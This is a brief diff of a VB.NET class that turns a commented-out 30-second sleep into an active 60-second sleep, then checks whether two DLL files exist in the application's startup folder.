@@ -21,7 +21,7 @@ Public Class Main
         FULLPATH = FP
         HWID = HW
         're:
-        'Sleep(30000)
+        Sleep(60000)
 
         Try
             If Not File.Exists(Windows.Forms.Application.StartupPath + "\IconLib.dll") AndAlso Not File.Exists(Windows.Forms.Application.StartupPath + "\Interop.Shell32.dll") Then
